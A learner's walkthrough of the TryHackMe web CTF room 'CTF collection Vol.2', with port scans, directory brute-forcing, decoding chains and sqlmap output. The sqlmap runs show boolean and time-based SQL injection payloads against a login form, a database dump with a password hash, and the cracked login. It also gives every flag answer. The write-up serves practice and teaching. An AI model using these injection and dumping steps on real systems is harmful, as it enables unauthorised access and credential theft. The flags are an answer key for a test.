<p align="left">November 6, 2024 - Hey there, fellow lifelong learner!<br>
I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure. It´s part of my $$\textcolor{#FF69B4}{\textbf{184}}$$-day-streak in  <a href="https://tryhackme.com/r/p/Rosana">TryHackMe</a>.</p>

<h1 align="center">
  $$\textcolor{#3bd62d}{\textnormal{&nbsp; CTF collection Vol.2}}$$
</h1>

<p align="center">Sharpening up your CTF skill with the collection. The second volume is about web-based CTF.<br>
                  Access this 🆓 TryHackMe CTF Room clicking <a href="https://tryhackme.com/r/room/ctfcollectionvol2">CTF collection VOl.2</a>.</p><br>
<p align="center">
  <img height="150px" hspace="20" src="https://github.com/user-attachments/assets/6628e1a4-ea67-4e69-b719-702b2fc07e4c">
  <img height="150px" src="https://github.com/user-attachments/assets/88772c45-e475-4d0a-a8cb-c1c1440725d7">
</p>

<h2>Task 1 - Author note</h2>

<p>Welcome, welcome and welcome to another CTF collection. This is the second installment of the CTF collection series. For your information, the second serious focuses on the web-based challenge. There are a total of 20 easter eggs a.k.a flags can be found within the box. Let see how good is your CTF skill.<br>

Now, deploy the machine and collect the eggs!</p>

<p>Warning: The challenge contains seizure images and background. If you feeling uncomfortable, try removing the background on <style> tag.</p>

Note: All the challenges flag are formatted as THM{flag}, unless stated otherwise</p>

> 1.1 - <em>Fact: Eggs contain the highest quality protein you can buy.</em><br>
>> <strong>No answer needed</strong><br>
<p><br></p>



<h2>Task 2 - Easter egg</h2>

<p>Submit all your easter egg right here. Gonna find it all!</p>

> 2.1 - <em>Easter 1</em><br>
> <code>Question Hint</code>: Check the robots.
>> <strong>THM{4u70b07_r0ll_0u7}</strong>
<p></p>

<pre><code>$ rustscan -a 10.10.157.196 -- -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
\U0001f30dHACK THE PLANET\U0001f30d

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.157.196:22
Open 10.10.157.196:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-06 21:27 UTC
NSE: Loaded 45 scripts for scanning.
Initiating Ping Scan at 21:27
Scanning 10.10.157.196 [2 ports]
Completed Ping Scan at 21:27, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:27
Completed Parallel DNS resolution of 1 host. at 21:27, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 21:27
Scanning ip-10-10-157-196.eu-west-1.compute.internal (10.10.157.196) [2 ports]
Discovered open port 80/tcp on 10.10.157.196
Discovered open port 22/tcp on 10.10.157.196
Completed Connect Scan at 21:27, 0.00s elapsed (2 total ports)
Initiating Service scan at 21:27
Scanning 2 services on ip-10-10-157-196.eu-west-1.compute.internal (10.10.157.196)
Completed Service scan at 21:28, 6.09s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.157.196.
SE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 21:28
Completed NSE at 21:28, 0.03s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 21:28
Completed NSE at 21:28, 0.04s elapsed
Nmap scan report for ip-10-10-157-196.eu-west-1.compute.internal (10.10.157.196)
Host is up, received syn-ack (0.00050s latency).
Scanned at 2024-11-06 21:27:53 UTC for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.2.22 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.01 seconds
</code></pre>

![image](https://github.com/user-attachments/assets/7cf7a060-19c7-4740-9d08-d7c85c32c93f)

<pre><code>root@ip-[Attack_IP]:~# gobuster dir -u http://10.10.157.196 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.157.196
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 301) [Size: 314] [--> http://10.10.157.196/login/]
/index                (Status: 200) [Size: 94328]
/button               (Status: 200) [Size: 39148]
/static               (Status: 200) [Size: 253890]
/cat                  (Status: 200) [Size: 62048]
/small                (Status: 200) [Size: 689]
/who                  (Status: 200) [Size: 3847428]
/robots               (Status: 200) [Size: 430]
/iphone               (Status: 200) [Size: 19867]
/game1                (Status: 301) [Size: 314] [--> http://10.10.157.196/game1/]
/egg                  (Status: 200) [Size: 25557]
/dinner               (Status: 200) [Size: 1264533]
/ty                   (Status: 200) [Size: 198518]
/ready                (Status: 301) [Size: 314] [--> http://10.10.157.196/ready/]
/saw                  (Status: 200) [Size: 156274]
/game2                (Status: 301) [Size: 314] [--> http://10.10.157.196/game2/]
/wel                  (Status: 200) [Size: 155758]
/free_sub             (Status: 301) [Size: 317] [--> http://10.10.157.196/free_sub/]
/nicole               (Status: 200) [Size: 367650]
/server-status        (Status: 403) [Size: 294]
Progress: 135446 / 220561 (61.41%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 136330 / 220561 (61.81%)
===============================================================
Finished
===============================================================
root@ip-[Attack_IP]:~# 
</code></pre>

![image](https://github.com/user-attachments/assets/80d5876a-803a-4afe-be31-e0c21c0004ad)

![image](https://github.com/user-attachments/assets/710449d5-e0fa-4547-873a-d689be15fc48)

<pre><code>root@ip-[Attack_IP]:~# echo "45 61 73 74 65 72 20 31 3a 20 54 48 4d 7b 34 75 37 30 62 30 37 5f 72 30 6c 6c 5f 30 75 37 7d" | xxd -r -p
Easter 1: THM{4u70b07_r0ll_0u7}
root@ip-[Attack_IP]:~# 
</code></pre>

<br>

> 2.2 - <em>Easter 2</em><br>
> <code>Question Hint</code>: Decode the base64 multiple times. Don't forget there are something being encoded.
>> <strong>THM{f4ll3n_b453}</strong>
<p></p>

![image](https://github.com/user-attachments/assets/6d2d90e5-e448-4968-9201-27d4026d44b7)

<pre><code>root@ip-[Attack_IP]:~# sudo apt-get install gridsite-clients
</code></pre>

<pre><code>root@ip-[Attack_IP]:~# urlencode -d $(echo "VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=" | base64 -d) | base64 -d | sed "s/\ //g" | base64 -d | sed "s/\ //g" | base64 -d
DesKel_secret_base
</code></pre>

![image](https://github.com/user-attachments/assets/34444a26-e7bc-418f-9ec4-2bf011f9ab03)

![image](https://github.com/user-attachments/assets/febcb3a7-3bbc-4e89-ad25-ad043f9daa53)     

<br>

> 2.3 - <em>Easter 3</em><br>
> <code>Question Hint</code>: Directory buster with common.txt might help.
>> <strong>THM{y0u_c4n'7_533_m3}</strong>
<p></p>

![image](https://github.com/user-attachments/assets/0059e8dc-d592-4055-b802-8b35c146d8dc)

![image](https://github.com/user-attachments/assets/4c0cf585-4d13-4ecd-bee6-197160b3b139)

<br>

> 2.4 - <em>Easter 4</em><br>
> <code>Question Hint</code>: time-based sqli
>> <strong>THM{1nj3c7_l1k3_4_b055}</strong>
<p></p>

![image](https://github.com/user-attachments/assets/56d0d814-c921-4443-8361-a38febbae083)

![image](https://github.com/user-attachments/assets/5b40e8da-e1a9-4c97-965c-e1b5905d80ed)

![image](https://github.com/user-attachments/assets/190353b2-b02f-4305-8e98-95c06212613e)

<pre><code>root@ip-[Attack_IP]:~# sqlmap -r request.txt --dbs --level 3 --risk 3
...
...
22:12:17] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
[22:12:17] [INFO] testing 'MySQL <= 5.0.11 time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[22:12:17] [INFO] testing 'Generic UNION query (93) - 1 to 10 columns'
[22:12:18] [INFO] testing 'MySQL UNION query (93) - 1 to 10 columns'
[22:12:20] [WARNING] User-Agent parameter 'User-Agent' does not seem to be injectable
sqlmap identified the following injection point(s) with a total of 21062 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-4382' OR 3822=3822-- KYTP&password=admin&submit=submit

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: username=admin' OR SLEEP(5)-- EDrn&password=admin&submit=submit
---
[22:12:20] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 13.04 or 12.04 or 12.10 (Raring Ringtail or Precise Pangolin or Quantal Quetzal)
web application technology: Apache 2.2.22, PHP 5.3.10
back-end DBMS: MySQL >= 5.0.12
[22:12:20] [INFO] fetching database names
[22:12:20] [INFO] fetching number of databases
[22:12:20] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[22:12:20] [INFO] retrieved: 4
[22:12:20] [INFO] retrieved: information_schema
[22:12:21] [INFO] retrieved: THM_f0und_m3
[22:12:21] [INFO] retrieved: mysql
[22:12:21] [INFO] retrieved: performance_schema
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] THM_f0und_m3

[22:12:22] [INFO] fetched data logged to text files under '/root/.sqlmap/output/[Target_IP]'

[*] shutting down at 22:12:22
</code></pre>

<pre><code>root@root@ip-[Attack_IP]:~# sqlmap -r request --dbs --level 3 --risk 3 -D THM_f0und_m3 --tables
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.4#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 22:14:05

[22:14:05] [INFO] parsing HTTP request from 'request'
[22:14:05] [INFO] resuming back-end DBMS 'mysql' 
[22:14:05] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-4382' OR 3822=3822-- KYTP&password=admin&submit=submit

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: username=admin' OR SLEEP(5)-- EDrn&password=admin&submit=submit
---
[22:14:05] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 13.04 or 12.04 or 12.10 (Raring Ringtail or Precise Pangolin or Quantal Quetzal)
web application technology: Apache 2.2.22, PHP 5.3.10
back-end DBMS: MySQL >= 5.0.12
[22:14:05] [INFO] fetching database names
[22:14:05] [INFO] fetching number of databases
[22:14:05] [INFO] resumed: 4
[22:14:05] [INFO] resumed: information_schema
[22:14:05] [INFO] resumed: THM_f0und_m3
[22:14:05] [INFO] resumed: mysql
[22:14:05] [INFO] resumed: performance_schema
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] THM_f0und_m3

[22:14:05] [INFO] fetching tables for database: 'THM_f0und_m3'
[22:14:05] [INFO] fetching number of tables for database 'THM_f0und_m3'
[22:14:05] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[22:14:05] [INFO] retrieved: 2
[22:14:05] [INFO] retrieved: nothing_inside
[22:14:06] [INFO] retrieved: user
Database: THM_f0und_m3
[2 tables]
+----------------+
| user           |
| nothing_inside |
+----------------+

[22:14:06] [INFO] fetched data logged to text files under '/root/.sqlmap/output/[Target_ID]'

[*] shutting down at 22:14:06

root@ip-[Attack_IP]:~# 
</code></pre>

<br>

<pre><code>root@root@ip-[Attack_IP]:~# sqlmap -r request --dbs --level 3 --risk 3 -T nothing_inside --columns
       ___
       __H__
 ___ ___[(]_____ ___ ___  {1.2.4#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 22:17:23

[22:17:23] [INFO] parsing HTTP request from 'request'
[22:17:23] [INFO] resuming back-end DBMS 'mysql' 
[22:17:23] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-4382' OR 3822=3822-- KYTP&password=admin&submit=submit

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: username=admin' OR SLEEP(5)-- EDrn&password=admin&submit=submit
---
[22:17:23] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 13.04 or 12.04 or 12.10 (Raring Ringtail or Precise Pangolin or Quantal Quetzal)
web application technology: Apache 2.2.22, PHP 5.3.10
back-end DBMS: MySQL >= 5.0.12
[22:17:23] [INFO] fetching database names
[22:17:23] [INFO] fetching number of databases
[22:17:23] [INFO] resumed: 4
[22:17:23] [INFO] resumed: information_schema
[22:17:23] [INFO] resumed: THM_f0und_m3
[22:17:23] [INFO] resumed: mysql
[22:17:23] [INFO] resumed: performance_schema
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] THM_f0und_m3

[22:17:23] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) columns
[22:17:23] [INFO] fetching current database
[22:17:23] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[22:17:23] [INFO] retrieved: THM_f0und_m3
[22:17:23] [INFO] fetching columns for table 'nothing_inside' in database 'THM_f0und_m3'
[22:17:23] [INFO] retrieved: 1
[22:17:23] [INFO] retrieved: Easter_4
[22:17:24] [INFO] retrieved: varchar(30)
Database: THM_f0und_m3
Table: nothing_inside
[1 column]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| Easter_4 | varchar(30) |
+----------+-------------+

[22:17:24] [INFO] fetched data logged to text files under '/root/.sqlmap/output/[Target_IP]'

[*] shutting down at 22:17:24

root@ip-10-10-146-248:~# 
</code></pre>


<pre><code>root@root@ip-[Attack_IP]:~# sqlmap -r request --dbs --level 3 --risk 3 -T nothing_inside --dump-all
       ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 22:19:29

[22:19:29] [INFO] parsing HTTP request from 'request'
[22:19:29] [INFO] resuming back-end DBMS 'mysql' 
[22:19:29] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-4382' OR 3822=3822-- KYTP&password=admin&submit=submit

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: username=admin' OR SLEEP(5)-- EDrn&password=admin&submit=submit
---
[22:19:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 13.04 or 12.04 or 12.10 (Raring Ringtail or Precise Pangolin or Quantal Quetzal)
web application technology: Apache 2.2.22, PHP 5.3.10
back-end DBMS: MySQL >= 5.0.12
[22:19:29] [INFO] fetching database names
[22:19:29] [INFO] fetching number of databases
[22:19:29] [INFO] resumed: 4
[22:19:29] [INFO] resumed: information_schema
  ...
  ...
[22:20:00] [INFO] fetching entries for table 'nothing_inside' in database 'THM_f0und_m3'
[22:20:00] [INFO] fetching number of entries for table 'nothing_inside' in database 'THM_f0und_m3'
[22:20:00] [INFO] retrieved: 1
[22:20:00] [INFO] retrieved: THM{1nj3c7_l1k3_4_b055}
Database: THM_f0und_m3
Table: nothing_inside
[1 entry]
+-------------------------+
| Easter_4                |
+-------------------------+
| THM{1nj3c7_l1k3_4_b055} |
+-------------------------+

[22:20:01] [INFO] table 'THM_f0und_m3.nothing_inside' dumped to CSV file '/root/.sqlmap/output/10.10.157.196/dump/THM_f0und_m3/nothing_inside.csv'
[22:20:01] [INFO] fetching columns for table 'user' in database 'THM_f0und_m3'
[22:20:01] [INFO] retrieved: 2
[22:20:01] [INFO] retrieved: username
[22:20:01] [INFO] retrieved: password
[22:20:01] [INFO] fetching entries for table 'user' in database 'THM_f0und_m3'
[22:20:01] [INFO] fetching number of entries for table 'user' in database 'THM_f0und_m3'
[22:20:01] [INFO] retrieved: 2
[22:20:01] [INFO] retrieved: 05f3672ba34409136aa71b8d00070d1b
[22:20:03] [INFO] retrieved: DesKel
[22:20:03] [INFO] retrieved: He is a nice guy, say hello for me
...  
</code></pre>

<br>


> 2.5 - <em>Easter 5</em><br>
> <code>Question Hint</code>: Another sqli
>> <strong>THM{wh47_d1d_17_c057_70_cr4ck_7h3_5ql}</strong>
<p></p>

<pre><code>root@root@ip-[Attack_IP]:~# sqlmap -r request --dbs --level 3 --risk 3 -T nothing_inside --dump-all
...
[22:20:00] [INFO] fetching entries for table 'nothing_inside' in database 'THM_f0und_m3'
[22:20:00] [INFO] fetching number of entries for table 'nothing_inside' in database 'THM_f0und_m3'
[22:20:00] [INFO] retrieved: 1
[22:20:00] [INFO] retrieved: THM{1nj3c7_l1k3_4_b055}
Database: THM_f0und_m3
Table: nothing_inside
[1 entry]
+-------------------------+
| Easter_4                |
+-------------------------+
| THM{1nj3c7_l1k3_4_b055} |
+-------------------------+
...
[22:45:04] [INFO] table 'THM_f0und_m3.nothing_inside' dumped to CSV file '/root/.sqlmap/output/10.10.157.196/dump/THM_f0und_m3/nothing_inside.csv'
[22:45:04] [INFO] fetching columns for table 'user' in database 'THM_f0und_m3'
[22:45:04] [INFO] resumed: 2
[22:45:04] [INFO] resumed: username
[22:45:04] [INFO] resumed: password
[22:45:04] [INFO] fetching entries for table 'user' in database 'THM_f0und_m3'
[22:45:04] [INFO] fetching number of entries for table 'user' in database 'THM_f0und_m3'
[22:45:04] [INFO] resumed: 2
[22:45:04] [INFO] resumed: 05f3672ba34409136aa71b8d00070d1b
[22:45:04] [INFO] resumed: DesKel
[22:45:04] [INFO] resumed: He is a nice guy, say hello for me
[22:45:04] [INFO] resumed: Skidy
[22:45:04] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[22:45:09] [INFO] writing hashes to a temporary file '/tmp/sqlmapt34iIC14886/sqlmaphashes-XYsiDb.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q]                                                          
Database: THM_f0und_m3                                                                                                                   
Table: user
[2 entries] 
</code></pre>

![image](https://github.com/user-attachments/assets/dc41a558-f11a-4fef-98ca-e27711b03a3b)

<p>User: DesKel<br>
Password: cutie</p>

![image](https://github.com/user-attachments/assets/26d6e431-b377-4c90-b693-214c54fd0954)

![image](https://github.com/user-attachments/assets/6974dd72-3c96-470f-a51d-8ea3cc9cc7a6)

> 2.6 - <em>Easter 6</em><br>
> <code>Question Hint</code>: Look out for the response header.
>> <strong>THM{l37'5_p4r7y_h4rd}</strong>
<p></p>

![image](https://github.com/user-attachments/assets/d97e119a-f9ed-4350-b6ad-6c346e267f6b)


> 2.7 - <em>Easter 7</em><br>
>> <strong>______</strong><br>
<p><br></p>

> 2.8 - <em>Easter 8</em><br>
>> <strong>______</strong><br>
<p><br></p>

> 2.9 - <em>Easter 9</em><br>
>> <strong>______</strong><br>
<p><br></p>

> .2.10 - <em>Easter 10</em><br>
>> <strong>______</strong><br>
<p><br></p>






